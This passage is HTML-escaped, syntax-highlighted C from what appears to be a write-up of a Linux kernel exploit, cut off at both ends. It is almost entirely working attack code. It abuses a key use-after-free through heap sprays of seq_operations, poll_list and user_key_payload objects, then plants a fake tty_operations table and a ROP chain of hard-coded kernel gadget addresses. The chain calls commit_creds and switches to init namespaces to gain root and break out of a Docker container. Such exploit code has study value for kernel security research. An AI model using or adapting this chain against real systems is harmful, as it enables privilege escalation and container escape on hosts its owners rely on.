&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[!] &lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">+0: 0x%lx (tty)&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, tmp[ix]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[!] &lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">+1: 0x%lx (*file)&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, tmp[ix &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[!] &lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">+2: 0x%lx (list_head.next)&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, tmp[ix &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[!] &lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">+3: 0x%lx (list_head.prev)&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, tmp[ix &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (km1024_leaked &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">print_curious&lt;/span>(keybuf, &lt;span style="color:#ae81ff">0x4300&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Failed to leak kmalloc-1024&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[!] leaked kmalloc-1024: 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, km1024_leaked);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/********************************************************/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Free `seq_operations`, one of which is `user_key_payload`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> NUM_SEQOPERATIONS &lt;span style="color:#f92672">-&lt;/span> NUM_FREE_SEQOPERATIONS; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_SEQOPERATIONS; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">close&lt;/span>(seqops_fd[ix]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Freeed seq_operations&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sleep&lt;/span>(&lt;span style="color:#ae81ff">5&lt;/span>); &lt;span style="color:#75715e">// TODO
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Spray `poll_list` in kmalloc-32, one of which is placed on `user_key_payload`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">assign_to_core&lt;/span>(&lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> neverend &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] spraying `poll_list` in kmalloc-32...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> num_threads &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_2ND_POLLLIST_ALLOC; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#66d9ef">alloc_poll_list_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>arg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">malloc&lt;/span>(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#66d9ef">alloc_poll_list_t&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>fd &lt;span style="color:#f92672">=&lt;/span> just_fd; arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>id &lt;span style="color:#f92672">=&lt;/span> ix;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>timeout_ms &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">3000&lt;/span>; &lt;span style="color:#75715e">// must 1000 &amp;lt; timeout_ms, to wait key GC
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>num_size &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">pthread_create&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>threads[ix], NULL, alloc_poll_list, arg) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;pthread_create&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// wait threads are initialized (to prevent double free)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">assign_to_core&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(num_threads &lt;span style="color:#f92672">!=&lt;/span> NUM_2ND_POLLLIST_ALLOC);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">usleep&lt;/span>(&lt;span style="color:#ae81ff">300&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Revoke UAFed key, which is on `poll_list` in kmalloc-32
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Freeing UAFed key...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">free_key&lt;/span>(uafed_key);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sleep&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Spray keys on UAFed `poll_list`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] spraying keys in kmalloc-32&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">assert&lt;/span>(num_keys &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>key_payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">malloc&lt;/span>(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset&lt;/span>(key_payload, &lt;span style="color:#e6db74">&amp;#39;X&amp;#39;&lt;/span>, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ((ulong&lt;span style="color:#f92672">*&lt;/span>)key_payload)[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x9999999999999999&lt;/span>; &lt;span style="color:#75715e">// debug
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> _alloc_key_prefill_ulong_val &lt;span style="color:#f92672">=&lt;/span> km1024_leaked &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>; &lt;span style="color:#75715e">// 0x18 is offset where `user_key_payload` can modify from
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_2ND_KEY_SPRAY; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">alloc_key&lt;/span>(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_ulong);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] waiting corrupted `poll_list` is freed...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> neverend &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_2ND_POLLLIST_ALLOC; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">pthread_join&lt;/span>(threads[ix], NULL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Free all keys
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_2ND_KEY_SPRAY; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">free_key&lt;/span>(keys[ix]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] waiting all keys are freed by GC...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sleep&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>); &lt;span style="color:#75715e">// wait GC(security/keys/gc.c) actually frees keys
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Spray keys in `kmalloc-1024`, one of which must be placed on `tty_struct`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] spraying keys in kmalloc-1024&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">assert&lt;/span>(num_keys &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>key_payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">malloc&lt;/span>(&lt;span style="color:#ae81ff">0x1000&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulong &lt;span style="color:#f92672">*&lt;/span>buf &lt;span style="color:#f92672">=&lt;/span> (ulong&lt;span style="color:#f92672">*&lt;/span>)key_payload;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> buf[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x5401&lt;/span>; &lt;span style="color:#75715e">// magic, kref (later `leave`ed and become RBP)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> buf[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff8191515a&lt;/span>); &lt;span style="color:#75715e">// dev (later become ret addr of `leave` gadget, which is `pop rsp`)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> buf[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> km1024_leaked &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x50&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x120&lt;/span>; &lt;span style="color:#75715e">// driver (MUST BE VALID) (later `pop rsp`ed)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> buf[&lt;span style="color:#ae81ff">3&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> km1024_leaked &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x50&lt;/span>; &lt;span style="color:#75715e">// ops
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulong &lt;span style="color:#f92672">*&lt;/span>ops &lt;span style="color:#f92672">=&lt;/span> (ulong&lt;span style="color:#f92672">*&lt;/span>)(key_payload &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x50&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0x120&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>ix) { &lt;span style="color:#75715e">// sizeof tty_operations
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ops[ix] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81577609&lt;/span>); &lt;span style="color:#75715e">// pop rsp
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulong &lt;span style="color:#f92672">*&lt;/span>rop &lt;span style="color:#f92672">=&lt;/span> (ulong&lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)ops &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x120&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81906510&lt;/span>); &lt;span style="color:#75715e">// pop rdi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff810ebc90&lt;/span>); &lt;span style="color:#75715e">// prepare_kernel_cred
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff812c32a9&lt;/span>); &lt;span style="color:#75715e">// pop rcx (to prevent later `rep`)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop &lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81a05e4b&lt;/span>); &lt;span style="color:#75715e">// mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff810eba40&lt;/span>); &lt;span style="color:#75715e">// commit_creds
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81906510&lt;/span>); &lt;span style="color:#75715e">// pop rdi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>; &lt;span style="color:#75715e">// init process in docker container
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff810e4fc0&lt;/span>); &lt;span style="color:#75715e">// find_task_by_vpid
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff812c32a9&lt;/span>); &lt;span style="color:#75715e">// pop rcx (to prevent later `rep`)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop &lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81a05e4b&lt;/span>); &lt;span style="color:#75715e">// mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff819b21d3&lt;/span>); &lt;span style="color:#75715e">// pop rsi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff8245a720&lt;/span>); &lt;span style="color:#75715e">// &amp;amp;init_nsproxy
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff810ea4e0&lt;/span>); &lt;span style="color:#75715e">// switch_task_namespaces
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81906510&lt;/span>); &lt;span style="color:#75715e">// pop rdi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff82589740&lt;/span>); &lt;span style="color:#75715e">// &amp;amp;init_fs
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff812e7350&lt;/span>); &lt;span style="color:#75715e">// copy_fs_struct
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff8131dab0&lt;/span>); &lt;span style="color:#75715e">// push rax; pop rbx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81906510&lt;/span>); &lt;span style="color:#75715e">// pop rdi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">getpid&lt;/span>();
